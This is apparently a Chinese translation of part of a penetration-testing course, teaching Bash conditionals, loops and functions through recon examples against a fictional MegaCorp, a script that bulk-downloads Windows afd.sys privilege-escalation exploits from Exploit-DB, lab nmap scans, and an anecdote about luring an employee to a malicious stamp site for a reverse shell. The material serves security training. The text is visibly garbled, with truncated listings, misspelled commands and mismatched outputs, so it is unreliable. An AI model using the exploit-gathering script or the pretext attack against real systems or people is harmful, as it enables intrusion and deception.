+`if` 和 `else` 语句只允许两个代码执行分支。我们可以通过 `else` 语句添加额外的分支，其使用的模式如下：
+
+```
+if [ <some test> ]
+then
+    <perform action>
+elif [ <some test> ]
+then
+    <perform different action>
+else
+    <perform yet another action>
+fi
+```
+
+列表 151 - Bash 中的 `elif` 语法
+
+让我们扩展 "age" 示例以包含 `elif` 语句：
+
+```
+kali@kali:-$ cat ./elif.sh
+!/bin/bash
+
+# elif example
+
+read -p "What is your age: " age
+if [ $age -lt 16 ]
+then
+    echo "You might need parental permission to take this course!"
+elif [ $age -gt 60 ]
+then
+```
+
+kali@kali:-$ chmod +x ./elif.sh
+
+kali@kali:-$ ./elif.sh
+What is your age: 65
+Hats off to you, respect!
+```
+
+列表 152 - 在 Bash 中使用 `elif` 语句
+
+在这个示例中，执行流要复杂得多。按照操作顺序，如果年龄小于 16，则执行 `then` 分支；如果年龄大于 60，则执行 `elif` 分支并显示“Hats off”消息；只有当年龄大于 16 但小于 60 时，才会执行 `else` 分支。
+
+## 5.4 布尔逻辑运算
+
+布尔运算符，¹¹⁸ 如 `AND` (`&&`) 和 `OR` (`||`) 是很神秘的，因为 Bash 以多种方式使用它们。
+
+其中一种用法是在命令列表中，命令列表是命令的链，其流由运算符控制。`|`（管道）符号是一个常用的运算符，它将将一个命令的输出传递给另一个命令的输入。同样，布尔逻辑运算符根据上一个命令是成功（或返回 True 或 0）还是失败（返回 False 或非零）来执行命令。
+
+让我们先来看 `AND` (`&&`) 布尔运算符，它只在在前一个命令成功（或返回 True 或 0）时才执行命令：
+
+```
+kali@kali:-$ user2=bob
+kali@kali:-$ grep user2 /etc/passwd && echo "$user2 found!"
+kali:x:1000:::/home/kali:/bin/bash
+kali found:
+
+kali@kali:-$ user2=bob
+kali@kali:-$ grep user2 /etc/passwd && echo "$user2 found!"
+```
+
+列表 153 - 在命令列表中使用 `AND` 布尔运算符
+
+在这个示例中，我们首先将要搜索的用户名赋值给变量 `user2`。接下来，使用 `grep` 命令检查特定用户是否列在 `/etc/passwd` 文件列表中，如果存在，`grep` 返回 True 并执行 `echo` 命令。然而，当我们尝试查找一个 `/etc/passwd` 文件中不存在的用户时，`echo` 命令将不会被执行。
+
+> ¹¹⁸ (MIT), https://libguides.mit.edu/c/?pg=175963&p=1158594
+
+在列表中使用时，`OR` (`||`) 运算符与 `AND` (`&&`) 相反；它只在前一个命令失败（False 或非零）时才执行下一个命令：
+
+```
+kali@kali-$ echo $user2
+bob
+kali@kali-$ grep $user2 /etc/passwd && echo "$user2 found!" || echo "$user2 not found!"
+bob not found!
+```
+
+列表 154 - 在命令列表中使用 `OR` (`||`) 布尔运算符
+
+在上面的示例中，我们将命令更进了一步，添加了 `OR` (`||`) 运算符并在其跟着第二个 `echo` 命令。现在，当 `grep` 未找到匹配行并返回 False 时，`OR` 运算符后的第二个 `echo` 命令将被执行。
+
+这些运算符也可以用于比较变量或其他测试的结果。当以这种方式使用时，`AND` (`&&`) 结合了两个简单条件，如果它们都为真，组合结果就是成功（True 或 0）。
+
+考虑这个示例：
+
+
+
+```
+kali@kali:-$ cat ./and.sh
+#!/bin/bash
+# and example
+
+if [ $USER == 'kali' ] && [ $HOSTNAME == 'kali' ]
+then
+echo "Multiple statements are true!"
+else
+echo "Not much to see.."
+fi
+
+```
+
+`kali@kali:-$ chmod +x ./and.sh`
+
+`kali@kali:-$ ./and.sh`
+
+Multiple statements are true!
+
+`kali@kali:-$ echo $USER && echo $HOSTNAME`
+
+列表 155 - 使用 AND (`&&`) 布尔运算符测试多个条件
+
+在这个示例中，我们使用 AND (`&&`) 测试多个条件，由于两个比较都是 True，`if` 行执行成功，然后进入分支。
+
+这种布尔运算符在满足时，AND (`&&`) 结合了两个条件条件。
+
+。。让我们看一个示例：
+
+```bash
+kali@kali:-$ ./or.sh
+
+#!/bin/bash
+
+# or example
+
+if [ $USER == 'kali' ] || [ $HOSTNAME == 'kali' ]
+
+then
+
+  echo "One is true"
+
+else
+
+  echo "You are out!"
+
+fi
+```
+
+### 5.5 循环
+
+在编程中，循环帮助我们处理直到满足特定条件的重复性任务。循环对于渗透测试人员来说非常有用。
+
+#### 5.5.1 For 循环
+
+`for` 循环在 Bash 中非常实用。让我们简单看一下它的语法：
+
+```bash
+for var-name in <list>
+do
+    <action>
+done
+```
+
+列表 157 - `for` 循环的通用语法
+
+循环将列表中的每一个项，将其赋值为 `var-name` 的值，执行 `do` 和 `done` 之间的操作，然后返回顶部，获取列表中的下一个项，直到列表耗尽。
+
+让我们看一个实际示例，它将快速打印 10.1.1.0/24 子网中的前 10 个 IP 地址：
+
+```
+kali@kali:~$ for ip in $(seq 1 10); do echo 10.11.1.$ip; done
+10.11.1.1
+10.11.1.2
+10.11.1.3
+10.11.1.4
+10.11.1.5
+10.11.1.6
+10.11.1.7
+10.11.1.8
+10.11.1.9
+10.11.1.10
+```
+
+列表 158 - 在 Bash 中使用循环的示例
+
+在这个 Bash 单行命令中，我们使用 `seq` 命令打印一个数字序列，在这种情况下，该数字被赋值给变量 `ip`，并在循环多次运行时显示每个 IP 地址。
+
+另一种重写之前的循环的方法是使用花括号扩展。范围的花括号扩展通过给定范围的起始和结束值来编写，可以是数字或字符序列。这被称为“序列表达式”：
+
+```
+kali@kali:~$ for i in {1..10}; do echo 10.11.1.$i; done
+10.11.1.1
+10.11.1.2
+10.11.1.3
+10.11.1.4
+10.11.1.5
+10.11.1.6
+10.11.1.7
+10.11.1.8
+10.11.1.9
+10.11.1.10
+```
+
+列表 159 - Bash 中使用范围的花括号扩展
+
+这种循环有很大的潜力。将 IP 地址显示在屏幕上似乎并不非常有用，但我们可以使用循环使用 `nmap` 进行端口扫描（我们在另一个模块中讨论过）。我们还可以尝试使用 `ping` 命令查看任何地址是否响应 ICMP 回显等。
+
+### 5.5.2 While 循环 (While Loops)
+
+While 循环也很常见，当表达式为真时执行代码。While 循环的格式非常简单，类似于 `if` 语句，使用方括号（`()`）进行测试。
+
+```
+while [ <test> ]
+do <perform an action>
+done
+```
+
+> 列表 160 - `while` 循环的通用语法
+
+让我们用 `while` 循环重新创建之前的示例：
+
+```
+kali@kali:~$ cat .while.sh
+#!/bin/bash
+
+# while loop example
+
+counter=1
+while [ $counter -lt 10 ]
+do
+  echo "10.11.1.$counter"
+  ((counter++))
+done
+
+kali@kali:-$ chmod +x ./while.sh
+10.11.1.1
+10.11.1.2
+10.11.1.3
+10.11.1.4
+10.11.1.5
+10.11.1.6
+10.11.1.7
+10.11.1.8
+10.11.1.9
+```
+
+> 列表 161 - 在 Bash 中使用 `while` 循环
+
+这不是我们期望的输出。这是一个被称为“差一错误”（off by one）的常见错误。在上面的示例中，我们使用了 `-lt`（小于）而不是 `-le`（小于或等于），所以我们的计数器只运行到九，而不是预期的十。
+
+`((counter++))` 使用双括号（`()`）¹³⁰ 结构来同时执行算术扩展和评估。在这种特定情况下，我们需要将计数器变量加 1。让我们重写 `while` 循环并尝试该示例：
+
+```
+kali@kali:-$ cat .while.sh
+#!/bin/bash
+
+# while loop example 2
+```
+
+> ¹⁹ (Stack Overflow, 2019), https://stackoverflow.com/questions/2393869/what-is-exactly-the-off-by-one-errors-in-the-while-loop
+¹³⁰ (Advanced Bash-Scripting Guide, 2014), http://tdip.org/RDP/abs/html/dblparens.html
+
+# 攻击性安全 (OFFENSIVE SECURITY)
+www.offensive-security.com
+
+Kali Linux 渗透测试 2.0
+
+```
+counter=1
+while [ $counter -le 10 ]
+do
+  echo "10.11.1.$counter"
+  ((counter++))
+done
+
+kali@kali:-$ chmod +x ./while2.sh
+kali@kali:-$ ./while2.sh
+10.11.1.1
+10.11.1.2
+10.11.1.3
+10.11.1.4
+10.11.1.5
+10.11.1.6
+10.11.1.7
+10.11.1.8
+10.11.1.9
+10.11.1.10
+```
+
+> 列表 162 - 在 Bash 中使用 `while` 循环的示例
+
+很好：我们的 `while` 循环现在看起来正常多了。
+
+### 5.6 函数 (Functions)
+
+在脚本编写方面，我们可以将函数视为脚本中的脚本，这当我们需要多次执行相同的代码时非常有用。与其反复重写相同的代码段，我们只需将其写为函数，然后根据需要调用该函数。
+
+另一种方法是使用子程序，或者说是实现一组操作的代码块——一个执行指定任务的“黑箱”。函数可以用两种不同的格式编写。第一种格式在 Bash 脚本中更常见：
+
+```
+function function_name {
+commands...
+}
+```
+
+> 列表 163 - 在 Bash 中编写函数的一种方式
+
+第二种格式对 C 语言程序员更为熟悉：
+
+```
+function_name () {
+commands...
+}
+```
+
+> 列表 164 - 在 Bash 中编写函数的另一种方式
+
+这些格式在功能上是等价的，取决于个人偏好。让我们来看一个简单的示例：
+
+```
+kali@kali:-$ cat ./func.sh
+#!/bin/bash
+
+# # 函数示例
+
+print_me {
+  echo "You have been printed!"
+}
+
+print_me
+
+kali@kali:-$ chmod +x ./func.sh
+kali@kali:-$ ./func.sh
+You have been printed!
+```
+
+> 列表 165 - 使用 Bash 函数向屏幕打印消息
+
+函数也可以接受参数：
+
+```
+kali@kali:-$ cat ./funcarg.sh
+#!/bin/bash
+
+# passing arguments to functions
+
+pass_arg() {
+  echo "Today's random number is: $1"
+}
+
+pass_arg $RANDOM
+
+kali@kali:-$ chmod +x ./funcarg.sh
+```
+
+
+
+kali@kali:-$ ./funcarg.sh
+
+Today's random number is: 25207
+
+> 列表 166 - 在 Bash 中向函数传递参数
+
+在这种情况下，我们将一个随机数 `$RANDOM` 传递给函数，函数将其输出为 `$1`，即函数的第一个参数。注意，函数定义 `pass_arg()` 包含括号。在其他编程语言（如 C）中，这些括号将计算预期参数，但在 Bash 中，括号仅起装饰作用。还要注意，函数定义本身必须在调用之前出现在脚本中。
+
+# 攻击安全
+
+保存到：`'index.html'`
+
+`index.html 100%[(2.56 MB) - 12.23K --KB/s in Os`
+
+```
+2018-03-18 17:56:54 (2.56 MB) - 'index.html' saved [12520/12520]
+```
+
+kali@kali:~ ls -l index.html
+
+`-rw-r--r-- 1 kali 12520 Mar 18 17:56 index.html`
+
+> 列表 170 - 从 megacorp.com 下载 index.html 页面
+
+手动扫描文件，我们看到了很多不需要的行。让我们开始缩小到需要的行范围，并剔除不需要的行。首先，我们使用 `grep "href="` 来提取 `index.html` 中所有包含 HTML 链接的行：
+
+```bash
+kali@index:~ grep "href="
+```
+
+```html
+<a href="http://beta.megacorp.com/util/files/news.html">MegaCorp CEO Joe Sher nominated for Nobel Prize in Physics, Medicine, and Literature prizes.</a><p><small>This is a fictitious company, brought to you by <a href="http://www.offensivesecurity.com" target="_blank">Offensive Security</a></a></a></small></p>
+<a href="https://www.facebook.com/Megacorp-One-39357002439695" target="_blank"><i class="fa fa-facebook"></i></a>>
+<a href="https://www.twitter.com/joe_sher"><i class="fa fa-twitter"></i></a>>
+<a href="https://www.linkedin.com/company/1826898/" target="_blank"><i class="fa fa-linkedin"></i></a>>
+<a href="https://github.com/megacorp" target="_blank"><i class="fa fa-github"></i></a>>
+```
+
+> 列表 171 - 识别 index.html 文件中的超链接
+
+让我们使用 `grep` 提取包含 `"megacorp"` 的行（这表示存在子域），并使用 `grep -v` 剔除我们已经知道的 `"www.megacorp.com"` 域名：
+
+```bash
+kali@kali:~ grep "href=" index.html | grep -v "www.megacorp.com" | head
+```
+
+```html
++<a href="http://support.megacorp.com/requests/index.html">Nanoprocessors</a>
+<a href="http://sys.megacorp.com/logs/view.php">MegaCorp</a>
+```
+
+> 列表 172 - 使用 grep 缩小搜索范围
+
+此输出向我们展示了正在减少的内容。通过以逻辑方式减少数据，使得每次处理后数据都变小，我们正处于最常见的数据处理过程中。
+
+看起来每行都包含一个链接和一个子域，但我们需要去掉链接周围的额外 HTML 代码。在 Bash 中执行任何任务总有多种方法，但我们将使用 `awk` 来设置一个多字符分隔符，而 `cut` 虽然简单但只能处理单字符分隔符。我们将分隔符设置为 `#`，并让 `awk` 找到第二个字段 `{print $2}`，或者该字段之后的所有内容：
+
+```bash
+kali@kali:~ grep "href=" index.html | grep ".megacorp" | grep -v "www.megacorp.com" | awk -F "http://" '{print $2}'
+```
+
+```html
+<a href="admin.megacorp.com/index/index.html">Generation</a>
+<a href="intranet.megacorp.com/pear">Immune Systems</a>
+<a href="mail.megacorp.com/menu">Cybersation</a>
+<a href="mail12.megacorp.com/relay">Weapons Systems</a>
+<a href="siem.megacorp.com/home">Entity Assignment</a>
+<a href="support.megacorp.com/ticket/requests/index.html">Nanoprocessors</a>
+```
+
+每行输出的开头显示我们正处于正确的道路上。现在我们可以使用 `cut` 将分隔符设置为 `/` (`-d`) 并打印第一个字段 (`-f1`)，从而只只剩下子域名：
+
+```bash
+kali@kali:~ grep "href=" index.html | grep ".megacorp" | grep -v "www.megacorp.com" | awk -F "http://" '{print $2}' | cut -d "/" -f1
+```
+
+```
+admin.megacorp.com
+intranet.megacorp.com
+mail.megacorp.com
+mail12.megacorp.com
+siem.megacorp.com
+support.megacorp.com
+```
+
+> 列表 174 - 截取域名
+
+这看起来很棒！然而，一个 Bash 大师看一眼我们的工作就会嗤之以鼻。这是因为我们用一种笨拙的方式使用了基本工具，尽管我们的缩减逻辑是正确的。Bash 及其相关的命令构建非常强大，总有更多值得学习的。
+
+如果我们为了改进而批评自己的工作（我们应该一直这样做），我们可能会发现一些改进方法。首先，我们从 `"href="` 开始并搜索 `http://`。这些本质上是链接，但这要求每行都必须有字符串。如果某行只有该内容但没有 `"href="`，我们就会漏掉一行。冗余是应该避免的，特别是在处理大文件时。此外，除非我们在寻找子域，否则我们不关心链接。另一个考虑因素是，我们花费了大量的时间通过筛选结果来查找并提取子域，这是很笨拙且容易出错的，而良好的正则表达式可以轻松处理这个问题。我们之前提到了正则表达式的力量，现在让我们来看看解决这个问题的硬核方法。
+
+# 攻击安全
+
+在这个例子中，我们将使用一个简单的正则表达式从文件中提取出 `"megacorp.com"` 子域：
+
+```bash
+kali@kali:~ grep -o '[^/]*\.megacorp\.com' index.html | sort -u
+```
+
+kali@kali:~ cat list.txt
+
+```
+admin.megacorp.com
+beta.megacorp.com
+intranet.megacorp.com
+mail12.megacorp.com
+siem.megacorp.com
+support.megacorp.com
+```
+
+
+
+# 列表 175 - 更优雅的正则表达式解决方案
+
+这个解决方案非常聪明，但引入了一些新技巧。首先，注意 `grep -o` 选项，它将返回正则表达式找到的字符串。如果我们仔细构造表达式，这个命令将处理大部分数据。提取看起来很复杂，但非常直接。我们要搜索的字符串 `[^/]*megacorp\.com` 被封装在单引号中，正如我们提到的，它将允许扩展并将字符视为字面量。表达式中的第一个块 `[^/]*` 是取反 (`^`)，它搜索包括斜杠内的任意字符。点用反斜杠转义 (`\.`) 以强化我们寻找的是字面上的点。当 `grep` 找到以 `megacorp\.com` 结尾的字符串时，它将从行中提取并返回它。
+
+为了使用逗号分隔的列表，这个块 `[,]*` 会排除斜杠和引号。这有很多新内容看起来让人无所措，但这是一个很好的正则表达式，它可以找到斜杠之后以 `megacorp\.com` 结尾的任何字符串，之后可以使用此正则表达式从文件中提取任意字符串。我们可以用这个正则表达式做更多，但这是一个很好的开始，也是正则表达式价值的例子。
+
+现在我们有了从 `megacorp.com` 页面链接良好的域名列表。接下来我们将使用 `host` 来发现文件中每个域对应的 IP 地址。我们可以使用一个 `bash` 循环来实现：
+
+```bash
+kali@kali:~ for url in $(cat list.txt); do host $url;
+```
+
+```
+admin.megacorp.com has address 38.100.93.83
+beta.megacorp.com has address 38.100.93.88
+intranet.megacorp.com has address 38.100.93.54
+mail12.megacorp.com has address 38.100.93.73
+```
+
+## 列表 176 - 使用 host 命令查找 IP 地址
+
+`host` 命令给我们的输出很多，但并非都是相关的。我们将通过将输出管道到 `grep "has address"` 来提取 IP 地址并进行排序：
+
+```bash
+kali@~$ for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f2 | sort -u
+```
+
+```
+38.100.93.66
+38.100.93.67
+38.100.93.73
+38.100.93.76
+38.100.93.77
+38.100.93.79
+38.100.93.84
+38.100.93.87
+38.100.93.88
+```
+
+## 列表 177 - 仅提取 IP 地址
+
+太棒了！我们从网页提取了 `"megacorp.com"` 子域并获得了对应的 IP 地址。正如我们所看到的，有多种方法可以使用 `Bash` 和相关工具以及正则表达式来处理数据，这强化了这样一个事实：在这些主题上花费任何时间都将为未来处理数据或加速进程节省大量时间。
+
+# 5.7.2 实用 Bash 使用 - 示例 2
+
+在这个例子中，假设我们正处于渗透测试中间，并且对 Windows 机器具有未授权访问权限。随着继续收集信息，我们意识到它可能受到我们读过的带有 a、f、d 字母的漏洞的攻击，我们无法记得该漏洞的全名。为了尝试提升权限，我们需要搜索那个特定的漏洞。
+
+为了做到这一点，我们需要搜索我们的标准并检查它们，直到找到正确的一个。我们可以手动通过网站 `https://www.exploit-db.com` 搜索 `"afd"`，下载匹配的漏洞将花费太长时间，但如果我们花时间编写一个 `Bash` 脚本，以后就可以轻松地使用它来自动下载漏洞。
+
+利用我们对脚本的了解，让我们尝试自动化此任务。
+
+我们将从 Kali Linux 上的 `SearchScript` 开始。`SearchExploit` 是 `Exploit-DB` 的一个命令行搜索工具，允许我们去到何处都创建一个漏洞数据库的离线副本。我们将 `"afd windows"` 作为搜索字符串，使用 `-w` 返回 `https://www.exploit-db.com` 的 URL 而不是本地路径，并使用 `-t` 搜索漏洞标题：
+
+| exploit Title | URL |
+| :--- | :--- |
+| Microsoft Windows (x86) - 'afd.sys' Privil | https://www.exploit-db.com/exploits/40564 |
+
+使用 Kali Linux 2 进行渗透测试
+
+| Microsoft Windows | 'afdJoinleaf' Privilege | https://www.exploit-db.com/exploits/21844 |
+| Microsoft Windows | 'afd.sys' Local Kernel | https://www.exploit-db.com/exploits/18755 |
+| Microsoft Windows 7 (x64) | 'afd.sys' Dang | https://www.exploit-db.com/exploits/39525 |
+| Microsoft Windows 7 (x86) | 'afd.sys' Dang | https://www.exploit-db.com/exploits/39446 |
+| Microsoft Windows XP Kernel | Pooled-Based OS | https://www.exploit-db.com/exploits/42089 |
+| Microsoft Windows XP | 'afd.sys' Local Ker | https://www.exploit-db.com/exploits/17133 |
+| Microsoft Windows XP 2003 | 'afd.sys' Priv | https://www.exploit-db.com/exploits/6757 |
+| Microsoft Windows XP 2003 | 'afd.sys' Priv | https://www.exploit-db.com/exploits/18176 |
+
+## 列表 178 - 使用 searchploit 搜索漏洞
+
+这是一个很好的开始，但我们需要精简结果。目前，我们只对漏洞的 URL 感兴趣，所以让我们 `grep` 搜索 `"http"` 并截取我们需要的内容。我们可以使用 `|` 作为字段分隔符并提取第二个字段：
+
+```bash
+kalikali~$ searchploit af windows -w -t | grep http | cut -f 2 -d "|"
+```
+
+```
+https://www.exploit-db.com/exploits/49564
+https://www.exploit-db.com/exploits/21844
+https://www.exploit-db.com/exploits/18755
+https://www.exploit-db.com/exploits/39525
+https://www.exploit-db.com/exploits/39446
+https://www.exploit-db.com/exploits/42089
+https://www.exploit-db.com/exploits/17133
+https://www.exploit-db.com/exploits/18176
+https://www.exploit-db.com/exploits/6757
+```
+
+## 列表 179 - 从 searchploit 的输出中提取 URL
+
+看起来好了一点。现在我们已经有了每个漏洞的 URL，可以使用 `Bash` 循环来下载文件并将其保存到本地。然而，在此之前，我们注意到每个页面都有一个下载“原始”（raw）漏洞代码的链接，这我们要需要的：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_125_0.png)
+
+# Microsoft Windows (x86) - 'afd.sys' 本地权限提升 (MS11-046)
+
+| EDB-ID | CVE | Author | Type | Platform | Published |
+|---|---|---|---|---|--|
+| 42364 | 2013-1249 | TOMISL PASKALEV | LOCAL | WINDOWS_ANY | 2014-05-18 |
+| | | EXPLOIT | View Raw | VULNERABLE APP: |
+
+```c
+/*
+************************************************
+
+# Title: Windows x86 (all版本) AFD 权限提升 (MS11-046)
+
+# Date: 2016-01-18
+
+# Author: Tomislav Paskalev
+
+# Vulnerable Software:
+
+# Windows XP x86
+
+# Windows XP SP2 x64
+```
+
+
+
+# Windows Server 2003 SP2 x86
+
+# Windows Server 2003 SP2 x64
+
+# Windows Server 2003 SP2 Itanium-Based Systems
+
+# Windows Vista x86
+
+# Windows Vista SP2 x86
+
+# Windows Vista SP2 x64
+
+# Windows Server 2008 x86
+
+# Windows Server 2008 SP2 x86
+
+# Windows Server 2008 x64
+
+# Windows Server 2008 SP2 x64
+
+# Windows Server 2008 Itanium-Based Systems*/
+
+![](img/f99f528ca9845f4c256ce54e882b1345_126_0.png)
+
+我们看到这个原始页面 (`/exploits/40564`) 链接到了原始链接（如 `/raw/40564`）。利用这些信息，我们可以运行 `sed s|exploits|/raw|` 来下载 URL 并将其插入到 Bash 单行命令中，以下载漏洞代码。
+
+我们使用 `for` 循环遍历 `SearchResults`。在循环内部，我们将 `exp_name` 设置为漏洞的“名称”（使用 `grep`、`cut` 和命令替换），将 `url` 设置为原始下载位置（使用 `sed` 和命令替换）。如果成功（`&&`），我们使用 `wget` 获取漏洞（在静默模式且不检查证书），并以漏洞名称作为文件名保存到本地。
+
+一旦运行，我们等待命令提示符并使用 `file` 验证漏洞是否已下载：
+
+```
+kali@kali~$ ls -l
+
+total 124
+
+-rw-r--r-- root 1363 Jan 17133
+
+-rw-r--r-- root 12215 Jan 18176
+
+-rw-r--r-- root 968 Jan 18755
+
+-rw-r--r-- root 11590 Jan 21844
+
+-rw-r--r-- root 10857 Jan 39446
+
+-rw-r--r-- root 14193 Jan 39525
+
+-rw-r--r-- root 32674 Jan 40564
+
+-rw-r--r-- root 12643 Jan 42009
+
+-rw-r--r-- root 619 Jan 6757
+```
+kali@kali: file 17133
+17133: ASCII, 带 CRLF 终止符
+
+列表 181 - 验证文件已下载
+
+我们可以检查每个漏洞，并实际上获取了原始漏洞：
+
+```
+kali@kali: cat 17133
+
+////////////////////////////////////////////////
+// Title: Microsoft Windows XP AFD.sys Local Kernel Exploit
+// Author: Lufeng of Corporation
+// Vendor: www.microsoft.com
+// Vulnerable: Windows sp3
+////////////////////////////////////////////////
+```
+```c
+#include <stdio.h>
+#include <winsock2.h>
+```
+```c
+BYTE buf[]={...};
+```
+```c
+int main()
+```
+
+列表 182 - 查看下载的漏洞
+
+虽然我们的代码并不清晰且特别容易复用。让我们将其整合到一个 Bash 脚本中解决这些问题：
+
+```bash
+kali@kali: cat exploits.sh
+
+#!/bin/bash
+
+# 用于搜索给定漏洞并下载所有匹配项的 Bash 脚本
+
+for e in $(searchploit af windows -w -t | grep http | cut -d "/" -f 2); do
+  exp_name=$(echo $e | cut -d "/" -f 5)
+  url=$(echo $e | sed 's/exploits/raw/')
+  wget -q --no-certificate $url $exp_name
+done
+```
+
+攻击性安全
+使用 Kali Linux 2.0 进行渗透测试
+
+```
+kali@kali~$ chmod +x ./exploits.sh
+kali@kali~$ ./exploits.sh
+```
+
+列表 183 - 使用 Bash 脚本下载文件
+
+我们现在可以手动检查感兴趣的漏洞，在测试机上尝试它们，最后在目标上找到正确的漏洞。在实时目标上发射漏洞是灾难性的。
+
+# 5.7.3 Bash Practical用法 – 示例 3
+
+作为渗透测试人员，我们总是试图寻找效率，以减少分析数据的时间，特别是扫描期间恢复的大量数据。假设任务是扫描 C 类子网以识别 Web 服务器并确定是否存在攻击面。端口扫描检查远程机器 TCP 或 UDP 端口的过程，旨在检测目标上运行的服务以及可能的攻击向量。我们将在另一个模块中详细讨论端口扫描，但现在保持通用，这是一个显示 Bash 脚本如何自动化任务的极佳示例。
+
+为了实现目标，我们首先扫描整个子网以确定可能的开放服务器，然后可以手动创建网页。
+
+为了开始，让我们创建一个用于练习的临时文件夹：
+
+```
+kali@kali~$ mkdir temp
+kali@kali~$ cd temp
+```
+
+列表 184 - 创建用于练习的临时文件夹
+
+现在我们创建了目录并通过 `cd` 进入，让我们进入更有趣的部分：扫描 C 类子网。我们将专注于端口 80 以保持范围可控，并使用 `nmap`（我们将在模块后部分讨论）作为扫描工具：
+
+```
+kali@kali~$ sudo nmap -p80 --open 10.11.11.0/24 nmap-scan-10.11.11.0
+Nmap scan started at 2023-01-01 00:00:00
+Target list: 10.11.11.0/24 (256 hosts scanned)
+Host 10.11.11.8 is up.
+PORT   STATE SERVICE
+80/tcp open  Apache httpd 2.0.52 ((CentOS))
+Host 10.11.11.10 is up.
+PORT   STATE SERVICE
+80/tcp open  Microsoft IIS httpd 6.0
+Host 10.11.11.13 is up.
+PORT   STATE SERVICE
+80/tcp open  Microsoft IIS httpd 5.1
+Nmap done: 100% of 256 hosts (3 hosts up)
+elapsed: 15.45 seconds
+```
+
+看起来每个 IP 地址都重复了两次，第一行显示机器状态，第二行显示被扫描的端口号。由于我们只对唯一的 IP 地址感兴趣，因此有必要进行一些清理工作。让我们使用 `grep` 查找查找包含端口 80 的行：
+
+```
+kali@~$ cat nmap-10.11.11.1-254 | grep 80
+# Map 7.60 scanned Sun Mar 18 15:47:18 as nmap -A -p80 -oO -oG nmap-can-10.11.11.1-254
+Host: 10.11.11.8 () Ports: 80/tcp//Apache http 2.0.52 (CentOS)/ Seq Index: 197 IP ID Seq: All zeros
+Host: 10.11.11.10 () Ports: 80/tcp//Microsoft IIS httpd 6.0/ Seq Index: 256 IP ID Seq: Incremental
+Host: 10.11.11.13 () Ports: 80/tcp//Microsoft IIS httpd 5.1/ Seq Index: 136 IP ID Seq: Incremental
+```
+
+> 列表 187 - 使用命令在文件中查找端口 80
+
+这是一个很好的开始，但第一行是无关的。为了排除它，我们再次使用 `grep` -v，这是一种“反向 grep”，只显示不匹配搜索字符串的行。在这种情况下，我们不想要任何包含区分敏感关键词“Nmap”的行。
+
+```
+kali@~$ cat nmap-scan-10.11.11.1-254 | grep 80 | grep -v "Nmap"
+Host: 10.11.11.8 () Ports: 80/tcp//Apache httpd 2.0.52 (CentOS)/ Seq Index: 197 IP ID Seq: All zeros
+
+
+
+Host: 10.11.11.10 () Ports: 80/tcp//Microsoft IIS httpd 6.0/ Seq Index: 256 IP ID Seq: Incremental
+
+Host: 10.11.11.13 () Ports: 80/tcp//Microsoft IIS httpd 5.1/ Seq Index: 136 IP ID Seq: Incremental
+
+> 列表 188 - 排除任何匹配 nmap 关键词的行
+
+我们的输出看起来好多了。让我们尝试提取 IP 地址，因为这才是我们真正感兴趣的。为了做到这一点，我们使用 `awk` 打印第二个字段，并使用 `Space` 作为分隔符。
+
+```
+kali@~$ cat nmap-scan_10.11.11.1-254 | grep 80 | grep -v "Nmap" | awk '{print $2}'
+```
+
+10.11.11.8
+
+10.11.11.10
+
+10.11.11.13
+
+10.11.11.14
+
+10.11.11.22
+
+10.11.11.31
+
+10.11.11.39
+
+10.11.11.49
+
+10.11.11.50
+
+10.11.11.71
+
+...
+
+> 列表 189 - 使用 awk 地址列表。在下一步，我们将使用一个 Bash 单行命令进行循环
+
+很好。这看起来是一个干净的 IP 列表。通过这个 IP 列表运行 **cutypes**，¹¹³ 这是一个 Qt WebKit 页面渲染截取工具。我们将使用 **url** 来指定目标网站，并使用 **out** 来指定输出文件名：
+
+`https://www.offensive-security.com`
+
+```
+kali@kali:~/tmp for ip in $(cat nmap-scan-10.11.1-254 | grep 80 | grep -v "Nmap") | awk '{print $2}'; do cut --url=$ip --out=$ip.png;done
+```
+
+> 列表 190 - 使用 cut 捕取所有服务器的截图
+
+一旦循环完成并出现提示符，我们就可以使用 **ls** 的 **-l** 来检查由 Bash 单行命令创建的输出文件，它每行显示一个文件，抑制额外的细节：
+
+```
+kali@kali:~/tmp ls -1 *.png
+```
+
+10.11.1.10.png
+
+10.11.1.115.png
+
+10.11.1.116.png
+
+10.11.1.128.png
+
+10.11.1.132.png
+
+10.11.1.133.png
+
+10.11.1.114.png
+
+10.11.1.202.png
+
+10.11.1.209.png
+
+10.11.1.217.png
+
+> 列表 191 - 探索我们 Bash 单行命令的结果
+
+非常出色。我们离目标更近了。我们可以单独检查这些文件，但更具吸引力的选择是再次运用我们的脚本知识，看看是否有可以自动化的内容。这不仅涉及 Bash 脚本技能，还需要 HTML 知识：
+
+> 列表 192 - 创建一个页面查看所有内容
+
+最后，我们将把脚本知识付诸实践，看看是否有可以自动化的内容。这不仅将提高 Bash 脚本技能，还需要 HTML 知识：
+
+# 攻性安全
+
+基于 Kali Linux 2.0 的渗透测试
+
+通过一次针对性的被动信息收集行动，利用了各种 Google 搜索运算符、被“管道”到其他工具中的信息片段，以及一些创意和逻辑思维，我们在一个集邮论坛中发现了一个目标公司某员工发表的帖子：
+
+你好！
+我正在寻找 20 世纪 50 年代的稀有邮票——出售或交易。
+请通过 david@company-address.com 与我联系。
+手机：999-999-9999
+
+列表 193 - 一个论坛帖子
+
+我们利用这些信息发起了一次半复杂的客户端攻击。我们迅速注册了与邮票相关的域名，并设计了一个落地页，显示了 20 世纪 50 年代的稀有邮票，这些邮票是通过 Google 图片找到的。域名的名称和网站的设计无疑增加了我们邮票交易网站的感官可靠性。
+
+接下来，我们在网站的网页中嵌入了一些恶毒的客户端攻击代码，并在工作期间拨打了“大卫”。在通话期间，我们伪装成一个继承了祖父巨大邮票收藏的集邮者。
+
+大卫接到我们的电话非常喜悦，并毫不犹豫地访问了恶意网站以查看那些“邮票收藏”。在浏览网站时，代码在他的本地机器上执行并使用了反向 shell（reverse shell）。
+
+这是一个很好的例子，说明了一些无害的被动收集的信息（例如员工使用公司邮箱处理个人事务）如何在渗透测试中导致获得立足点。最微小的细节也可能是最重要的。
+
+> “大卫”并没有遵循最佳实践，是公司的政策和缺乏安全意识计划为这次泄露铺平了道路。正因如此，我们在书面报告中避免了指责某个人。我们作为渗透测试员的目标是提高客户资源的安全的安全性，而不是针对单个员工。简单地解雇“大卫”并不能解决问题。
+
+让我们来看看所有可以帮助我们成功开展信息收集行动的最流行的工具和技术。我们将使用 MegaCorp One，¹³⁸（由 Offensive Security 创建的一家虚拟公司）作为我们行动的对象。
+
+## 6.1 记录笔记
+
